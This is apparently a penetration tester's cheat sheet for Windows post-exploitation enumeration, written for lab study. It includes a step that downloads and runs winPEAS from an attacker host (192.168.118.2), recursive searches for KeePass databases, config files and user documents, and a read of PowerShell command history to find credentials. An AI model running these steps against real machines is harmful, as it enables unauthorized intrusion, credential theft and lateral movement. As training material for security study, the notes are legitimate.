## Windows Enumeration
Having gained a foothold on a Windows machine by whatever mechanism the following items are important steps for us to gain situational awareness, with each item potentially proving critical to a successful effort at privilege escalation or lateral movement:

### winPEAS
Below is a lengthy list of commands that you can make use of in the event that `winPEAS` is impossible to smuggle onto the machine or is blocked via AV somehow. But under most circumstances lets not be cringe and use the purpose-built tool to enumerate a Windows environment:

In Kali:
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```
On the target machine:
```powershell
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```
Look upon our exploitable shit ye mighty and despair!

### Username and hostname
```cmd
whoami
```
### Group memberships of the current user
```cmd
whoami /groups
```
### Existing users and groups
```powershell
Get-LocalUser
```
```powershell
Get-LocalGroup
```
```powershell
Get-LocalGroupMember adminteam
```
```powershell
Get-LocalGroupMember Administrators
```
CMD command for miscllelaneous info on a particular user:
```cmd
net user <username>
```
### Operating system, version and architecture
```powershell
systeminfo
```
### Network information
To list all network interfaces:
```powershell
ipconfig /all
```
To display the routing table and potentially enumerate links to other systems or networks that haven't yet been enumerated:
```powershell
route print
```
To enumerate the active network connections on a Windows system (with no DNS resolution):
```powershell
netstat -ano
```
### Installed applications
To enumerate all 32 bit applications installed on the machine:
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
and for the 64 bit applications:
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
Nb. this is not necessarily a complete list, never forget to check the `C:\ProgramFiles*` directories, as well as the `C:\tools` and `Downloads` paths.
### Running processes
```powershell
Get-Process
```
To find the binary running that process:
```powershell
Get-Process | Select-Object Path
```
### Finding Critical Files
KeePass files:
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
XAMPP Web Server config:
```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
Misc. Data File Discovery:
```powershell
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

### Impersonation
If we have a GUI session then we can run a new session as a different user with:
```powershell
runas /user:admin cmd
```

### Command History
```powershell
Get-History
```
```powershell
(Get-PSReadlineOption).HistorySavePath | ForEach-Object {cat $_}
```
